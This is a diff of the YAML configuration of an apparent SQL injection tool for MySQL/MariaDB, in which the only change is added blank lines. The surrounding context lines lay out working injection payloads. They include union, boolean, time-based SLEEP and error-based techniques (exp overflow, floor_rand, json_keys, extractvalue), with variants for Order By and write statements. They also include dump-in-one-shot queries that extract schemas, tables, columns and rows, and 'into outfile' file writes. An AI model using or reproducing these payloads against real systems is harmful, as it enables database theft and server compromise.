@@ -10,6 +10,7 @@ resource:
        ),
        ${TRAIL_HEX}
    )
+   
  schema: 
   database: |
    select concat(
@@ -36,6 +37,7 @@ resource:
        group by r
        {limit}
    ) x
+   
   table: |
    select concat(
        group_concat(
@@ -57,6 +59,7 @@ resource:
        order by r
        {limit}
    ) x
+   
   column: |
    select concat(
        group_concat(
@@ -77,6 +80,7 @@ resource:
        order by n
        {limit}
    ) x
+   
   row: 
    query: |
           select concat(
@@ -102,6 +106,7 @@ resource:
     field: "trim(ifnull(`${FIELD}`, 0x00))"
     concat: ",0x7f,"
   limit: "limit ${LIMIT}, 65536"
+  
  zipped: 
   database: |
    select concat(
@@ -111,6 +116,7 @@ resource:
    )
    from INFORMATION_SCHEMA.schemata
    {limit}
+   
   table: |
    select concat(
        ${ENCLOSE_VALUE_HEX},
@@ -120,6 +126,7 @@ resource:
    from information_schema.tables
    where TABLE_SCHEMA = 0x${DATABASE.HEX}
    {limit}
+   
   column: |
    select concat(
        ${ENCLOSE_VALUE_HEX},
@@ -130,6 +137,7 @@ resource:
    where TABLE_SCHEMA = 0x${DATABASE.HEX}
    and TABLE_NAME = 0x${TABLE.HEX}
    {limit}
+   
   row: 
    query: |
           select concat(
@@ -143,6 +151,7 @@ resource:
     field: "trim(ifnull(`${FIELD}`, 0x00))"
     concat: ",0x7f,"
   limit: "limit ${LIMIT}, 1"
+  
  dios: 
   database: |
    select concat(@:=0,(select count(*) from (
@@ -153,6 +162,7 @@ resource:
        ) a
        from INFORMATION_SCHEMA.schemata
    )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+   
   table: |
    select concat(@:=0,(select count(*) from (
        select concat(
@@ -163,6 +173,7 @@ resource:
        from information_schema.tables
        where TABLE_SCHEMA = 0x${DATABASE.HEX}
    )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+   
   column: |
    select concat(@:=0,(select count(*) from (
        select concat(
@@ -174,6 +185,7 @@ resource:
        where TABLE_SCHEMA = 0x${DATABASE.HEX}
        and TABLE_NAME = 0x${TABLE.HEX}
    )x where @ :=concat(@,a) {limit}), @, '${TRAIL_SQL}')
+   
   row:
    query: |
           select concat(@:=0,(select count(*) from (
@@ -188,6 +200,7 @@ resource:
     field: "trim(ifnull(`${FIELD}`, 0x00))"
     concat: ",0x7f,"
   limit: "limit ${LIMIT}, 1"
+  
  file: 
   privilege: |
    cast(
@@ -206,6 +219,7 @@ resource:
   create: 
    content: "(select 0x${CONTENT.HEX})"
    query: "into outfile \"${FILEPATH}\""
+   
 strategy: 
  configuration: 
   slidingWindow: |
@@ -231,6 +245,7 @@ strategy:
     - MySQL
     - "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near"
     - MariaDB
+    
  normal: 
   indices: "union select ${INDICES}"
   capacity: |
@@ -242,6 +257,7 @@ strategy:
        )
    )
   orderBy: "order by 1337"
+  
  boolean: 
   test: 
    falses: 
@@ -276,6 +292,7 @@ strategy:
        1, 
        SLEEP(${SLEEP_TIME})
    )
+   
  error: 
   method: 
    - name: "BIGINT::exp"
@@ -287,6 +304,7 @@ strategy:
           ) x
       )-~0
      capacity: 64
+     
    - name: "BIGINT::exp in Order By"
      query: |
       1, (
@@ -301,6 +319,7 @@ strategy:
           ) x
       )
      capacity: 64
+     
    - name: "BIGINT::exp in Delete Update Insert"
      query: |
       ' or (
@@ -312,6 +331,7 @@ strategy:
           )-~0
       ) or '"
      capacity: 64
+     
    - name: "DOUBLE::exp"
      query: |
       and 1 = exp(
@@ -323,6 +343,7 @@ strategy:
           )
       )
      capacity: 64
+     
    - name: "DOUBLE::exp in Order By"
      query: |
       1, (
@@ -336,6 +357,7 @@ strategy:
           )
       )
      capacity: 64
+     
    - name: "DOUBLE::exp in Delete Update Insert"
      query: |
       ' or (
@@ -349,6 +371,7 @@ strategy:
           )
       ) or '
      capacity: 64
+     
    - name: "GROUPBY::floor_rand"
      query: |
       or exists(
@@ -362,6 +385,7 @@ strategy:
           group by 2
       )
      capacity: 64
+     
    - name: "GROUPBY::floor_rand in Order By"
      query: |
       1, (
@@ -377,6 +401,7 @@ strategy:
           ) x
       )
      capacity: 64
+     
    - name: "GROUPBY::floor_rand in Delete Insert Update"
      query: |
       ' or (
@@ -392,6 +417,7 @@ strategy:
           ) x
       ) or '
      capacity: 64
+     
    - name: "JSON::json_keys"
      query: |
       /* Require FALSE statement, then OR */
@@ -406,6 +432,7 @@ strategy:
           )
       )
      capacity: 64
+     
    - name: "JSON::json_keys in Order By"
      query: |
       /* Require FALSE statement, then OR */
@@ -420,6 +447,7 @@ strategy:
           )
       )
      capacity: 64
+     
    - name: "JSON::json_keys in Delete Insert Update"
      query: |
       ' or (
@@ -433,6 +461,7 @@ strategy:
           )
       ) or '
      capacity: 64
+     
    - name: "XML::extractvalue"
      query: |
       and 1 = extractvalue(
@@ -443,6 +472,7 @@ strategy:
           )
       )
      capacity: 99
+     
    - name: "XML::extractvalue in Order By"
      query: |
       1, (
@@ -457,6 +487,7 @@ strategy:
           ) x
       )
      capacity: 99
+     
    - name: "XML::extractvalue in Delete Insert Update"
      query: |
       ' or (
